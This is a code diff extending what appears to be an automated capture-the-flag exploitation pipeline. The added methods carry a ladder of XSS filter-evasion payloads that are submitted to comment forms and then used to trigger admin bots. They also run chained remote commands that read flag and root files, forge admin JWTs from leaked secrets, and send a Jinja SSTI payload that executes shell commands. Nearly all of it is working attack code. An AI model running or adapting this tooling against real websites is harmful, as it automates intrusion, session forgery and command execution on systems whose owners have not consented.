+        """Check admin/flag pages for captured flags."""
+        for path in ["/admin", "/flag", "/admin/flag", "/dashboard", "/panel"]:
+            try:
+                r = self.session.get(urljoin(self.target_url, path), timeout=5)
+                if self._check_and_store_flags(r.text, f"Admin page ({path})"):
+                    return True
+            except Exception:
+                pass
+        return False
 
 
     def _exploit_file_upload(self):
@@ -993,6 +1670,167 @@ class AutoPwnPipeline:
                 pass
 
 
+    def _exploit_xss_to_admin(self):
+        """
+        Detect & exploit XSS-to-Admin challenges (forum / message-board + admin bot / report endpoint).
+        Strategy:
+          1. Detect a "report to admin" / "contact admin" / "send to admin" endpoint or form.
+          2. Detect a message/comment/post submission form (stored XSS sink).
+          3. Probe the sink for reflection & filter behavior (blocked payloads => "Hacker detected").
+          4. Iterate OWASP filter-evasion payloads, escalating from simple to polyglot/mXSS.
+          5. On a payload that survives the filter, submit it, then trigger the admin bot.
+          6. Record the winning technique in the learning engine so future challenges reuse it.
+        """
+        print_info("Testing XSS-to-Admin (Stored XSS + Admin Bot) Vectors...")
+        html = self.state.get("baseline_html", "")
+        if not html:
+            return
+
+        # --- 1. Detect admin-bot / report endpoints -----------------------------------------
+        report_endpoints = []
+        for ep in self.state.get("endpoints", []):
+            el = ep.lower()
+            if any(k in el for k in ["report", "contact", "admin", "bot", "visit", "submit", "send"]):
+                report_endpoints.append(ep)
+        # Also scan the baseline HTML for report links/forms
+        for m in re.findall(r'(?:href|action)\s*=\s*["\']([^"\']*(?:report|contact|admin|bot|visit)[^"\']*)["\']', html, re.IGNORECASE):
+            report_endpoints.append(urljoin(self.target_url, m))
+        report_endpoints = list(dict.fromkeys(report_endpoints))
+
+        # --- 2. Detect message/comment/post submission forms (stored XSS sink) --------------
+        sink_forms = []
+        for f in self.state.get("forms", []):
+            names = [i.get("name", "").lower() for i in f.get("inputs", [])]
+            if any(k in n for n in names for k in ["message", "comment", "post", "content", "text", "msg", "body", "title", "subject"]):
+                sink_forms.append(f)
+        # Fallback: any form with a textarea or text input
+        if not sink_forms:
+            for f in self.state.get("forms", []):
+                if any(i.get("type") in ("textarea", "text") for i in f.get("inputs", [])):
+                    sink_forms.append(f)
+
+        # --- 3. Determine if this looks like an XSS-to-admin challenge ----------------------
+        is_forum = any(k in html.lower() for k in ["forum", "message", "comment", "guestbook", "post", "thread", "board"])
+        has_admin_bot = bool(report_endpoints)
+        if not (is_forum or has_admin_bot):
+            # Still try if there is any text sink form
+            if not sink_forms:
+                return
+
+        # --- 4. OWASP filter-evasion payload ladder (ordered by subtlety) -------------------
+        payload_ladder = [
+            # 0. Plain (baseline / filter confirmation)
+            "<script>alert(1)</script>",
+            # 1. Case / whitespace / newline obfuscation
+            "<ScRiPt>alert(1)</sCrIpT>",
+            "<script\n>alert(1)</script>",
+            "<script\t>alert(1)</script>",
+            # 2. HTML entity encoding
+            "&lt;script&gt;alert(1)&lt;/script&gt;",
+            "&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;",
+            # 3. Event handlers on benign tags
+            "<img src=x onerror=alert(1)>",
+            "<svg onload=alert(1)>",
+            "<body onload=alert(1)>",
+            "<input autofocus onfocus=alert(1)>",
+            "<details open ontoggle=alert(1)>",
+            "<marquee onstart=alert(1)>",
+            # 4. javascript: URI in attributes
+            "<a href=javascript:alert(1)>x</a>",
+            "<iframe src=javascript:alert(1)>",
+            # 5. Tag-name / attribute obfuscation
+            "<svg/onload=alert(1)>",
+            "<img src=x onerror=&#97;lert(1)>",
+            "<img src=x onerror=alert&#40;1&#41;>",
+            "<img src=x onerror=alert(1)//",
+            # 6. Null byte / tab / newline inside tag
+            "<img%0Asrc=x%0Aonerror=alert(1)>",
+            "<img src=x onerror=alert(1)%00>",
+            # 7. mXSS / polyglot
+            "<svg><script>alert(1)</script></svg>",
+            "<math><mtext><script>alert(1)</script></mtext></math>",
+            "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
+            # 8. Double-encoding / nested
+            "%253Cscript%253Ealert(1)%253C/script%253E",
+            "<scr<script>ipt>alert(1)</scr</script>ipt>",
+            # 9. CSS / style-based
+            "<div style=\"background:url(javascript:alert(1))\">x</div>",
+            "<style>@import 'javascript:alert(1)';</style>",
+            # 10. SVG foreignObject
+            "<svg><foreignObject><iframe src=javascript:alert(1)></iframe></foreignObject></svg>",
+        ]
+
+        # --- 5. Probe the sink for reflection & filter behavior ------------------------------
+        def _probe_sink(form, payload):
+            """Submit payload to a sink form; return (response_text, blocked)."""
+            action_url = form.get("action", self.target_url)
+            method = form.get("method", "POST")
+            data = {}
+            for inp in form.get("inputs", []):
+                iname = inp.get("name", "")
+                if not iname:
+                    continue
+                if any(k in iname.lower() for k in ["message", "comment", "post", "content", "text", "msg", "body", "title", "subject"]):
+                    data[iname] = payload
+                else:
+                    data[iname] = inp.get("value", "")
+            try:
+                if method.upper() == "POST":
+                    r = self.session.post(action_url, data=data, timeout=6)
+                else:
+                    r = self.session.get(action_url, params=data, timeout=6)
+                blocked = any(k in r.text.lower() for k in ["hacker detected", "forbidden", "blocked", "invalid input", "attack detected"])
+                return r.text, blocked
+            except Exception:
+                return "", True
+
+        # --- 6. Iterate payloads, escalating ------------------------------------------------
+        winning_payload = None
+        winning_form = None
+        for form in sink_forms:
+            for payload in payload_ladder:
+                resp_text, blocked = _probe_sink(form, payload)
+                if blocked:
+                    continue
+                # Payload survived the filter. Check if it reflected (stored XSS likely).
+                # A stored XSS won't reflect immediately; check for success indicators.
+                if any(k in resp_text.lower() for k in ["success", "posted", "sent", "added", "thank", "message", "comment"]):
+                    winning_payload = payload
+                    winning_form = form
+                    print_success(f"XSS payload survived filter & was accepted: [bold green]{payload}[/bold green]")
+                    break
+            if winning_payload:
+                break
+
+        # --- 7. Trigger admin bot if we have a winning payload ------------------------------
+        if winning_payload and report_endpoints:
+            print_info(f"Triggering admin bot via [bold cyan]{report_endpoints[0]}[/bold cyan]...")
+            for rep in report_endpoints:
+                try:
+                    r = self.session.get(rep, timeout=6)
+                    self._check_and_store_flags(r.text, f"Admin Bot Response ({rep})")
+                    # Some bots accept a POST with the URL to visit
+                    if r.status_code == 405 or "method" in r.text.lower():
+                        r2 = self.session.post(rep, data={"url": self.target_url, "link": self.target_url}, timeout=6)
+                        self._check_and_store_flags(r2.text, f"Admin Bot POST ({rep})")
+                except Exception:
+                    pass
+
+        # --- 8. Record learning --------------------------------------------------------------
+        if winning_payload:
+            self._log_step("Phase 4: Exploitation", f"XSS-to-Admin payload accepted: {winning_payload}")
+            self.learning_engine.record_success(
+                self.target_url, self.state["tech_stack"], "xss_to_admin", "filter_evasion",
+                winning_payload, list(self.state["captured_flags"]),
+                chain_steps=["detect_report_endpoint", "submit_stored_xss", "trigger_admin_bot"]
+            )
+        else:
+            # Record the filter behavior so future runs know this target blocks obvious payloads
+            self.learning_engine.record_failure(
+                self.target_url, self.state["tech_stack"], ["xss_to_admin"],
+                reason="XSS filter blocked all tested evasion payloads"
+            )
+
 
     def _exploit_php_tricks(self):
         """Active PHP Type Juggling, Header/IP Spoofing, Stream Wrappers and Verb Tampering."""
@@ -1039,11 +1877,96 @@ class AutoPwnPipeline:
                 "eval() code injection", list(self.state["captured_flags"])
             )
 
+    def _trigger_chains_from_exploitation(self):
+        """
+        Trigger the Vulnerability Chaining Engine from ACTIVE exploitation results,
+        not just leaked source files. Uses captured flags, RCE availability, leaked
+        secrets, and admin access to build and execute secondary exploit chains.
+        """
+        feedback = self.state.get("exploitation_feedback", {})
+        captured_flags = feedback.get("captured_flags", []) or list(self.state.get("captured_flags", []))
+        has_rce = feedback.get("active_rce_method") or bool(self.state.get("active_rce_method"))
+        leaked_secrets = feedback.get("leaked_secrets", {}) or self.state.get("leaked_secrets", {})
+        admin_accessible = feedback.get("admin_accessible") or self.state.get("admin_accessible")
+        chain_results = feedback.get("chain_results", {}) or self.state.get("reasoning_chain_results", {})
+
+        # Only trigger if we have meaningful exploitation progress
+        if not (captured_flags or has_rce or leaked_secrets or admin_accessible or chain_results):
+            return
+
+        print_info("Triggering Chaining Engine from Active Exploitation Results...")
+
+        # ── 1. If we have RCE, chain it into deeper flag hunting ─────────
+        if has_rce:
+            print_info("RCE available - chaining into deep flag extraction & system exploration...")
+            try:
+                out = self.state["active_rce_method"](
+                    "cat /flag* /flag.txt /root/flag.txt /root/root.txt /home/*/*flag* /app/flag* 2>/dev/null; "
+                    "find / -name '*flag*' -exec cat {} + 2>/dev/null"
+                )
+                self._check_and_store_flags(out, "Chained RCE flag hunt")
+            except Exception:
+                pass
+
+        # ── 2. If we have leaked secrets, chain into session forgery ────
+        if leaked_secrets.get("secret_key") or leaked_secrets.get("jwt_secret"):
+            secret = leaked_secrets.get("secret_key") or leaked_secrets.get("jwt_secret")
+            print_info(f"Leaked secret available - chaining into session forgery ({secret[:8]}...)...")
+            try:
+                forged = sign_jwt_hs256({}, {"user": "admin", "role": "admin", "isAdmin": True}, secret)
+                for path in ["/admin", "/admin/dashboard", "/dashboard", "/flag", "/admin/flag", "/panel"]:
+                    try:
+                        r = self.session.get(urljoin(self.target_url, path),
+                                             cookies={"session": forged, "jwt": forged, "token": forged}, timeout=5)
+                        self._check_and_store_flags(r.text, f"Chained session forgery ({path})")
+                        if r.status_code == 200:
+                            print_success(f"Chained Admin Access via Forged Token: {path}")
+                            self.state["admin_accessible"] = True
+                            # Try SSTI in admin params
+                            admin_parsed = extract_forms_and_links(r.text, urljoin(self.target_url, path))
+                            for p in admin_parsed["parameters"]:
+                                ssti_resp = self.session.get(
+                                    urljoin(self.target_url, path),
+                                    params={p: "{{ lipsum.__globals__['os'].popen('cat /flag* || cat /root/*flag*').read() }}"},
+                                    cookies={"session": forged}, timeout=5)
+                                self._check_and_store_flags(ssti_resp.text, f"Chained admin SSTI ({p})")
+                    except Exception:
+                        pass
+            except Exception:
+                pass
+
+        # ── 3. If admin is accessible, chain into admin-only flag hunting ──
+        if admin_accessible:
+            print_info("Admin access available - chaining into admin-only flag hunting...")
+            for path in ["/admin", "/admin/flag", "/flag", "/admin/dashboard", "/panel", "/admin/readflag"]:
+                try:
+                    r = self.session.get(urljoin(self.target_url, path), timeout=5)
+                    self._check_and_store_flags(r.text, f"Chained admin flag ({path})")
+                except Exception:
+                    pass
+
+        # ── 4. If XSS payload was submitted, chain into admin bot exploitation ──
+        if self.state.get("xss_payload_submitted") and not self.state.get("admin_bot_triggered"):
+            print_info("Stored XSS submitted - chaining into admin bot trigger...")
+            self._trigger_admin_bot()
+            self._check_admin_bot_result()
+
+        # ── 5. If chain results exist, log the completed chains ─────────
+        if chain_results:
+            for name, results in chain_results.items():
+                done = sum(1 for r in results if r)
+                print_info(f"  Chain '{name}': {done}/{len(results)} steps completed")
+                self._log_step("Phase 5: Chaining", f"Chain '{name}' progress: {done}/{len(results)}",
+                               details="; ".join(f"step{i+1}={'OK' if r else 'X'}" for i, r in enumerate(results)))
+
     # =========================================================================
     # PHASE 5: تصعيد الصلاحيات وربط الثغرات (Privilege Escalation & Chaining Core)
     # =========================================================================
     def phase5_privilege_escalation(self):
         print_header("المرحلة 5: تصعيد الصلاحيات وربط الثغرات", "Phase 5: Vulnerability Chaining & Privilege Escalation")
+
+        # 0. Trigger chaining engine from ACTIVE exploitation results (not just leaked files)
+        self._trigger_chains_from_exploitation()
         
         # 1. Multi-Stage Vulnerability Chaining Analysis on Leaked Files
         if self.state["leaked_source_files"]:
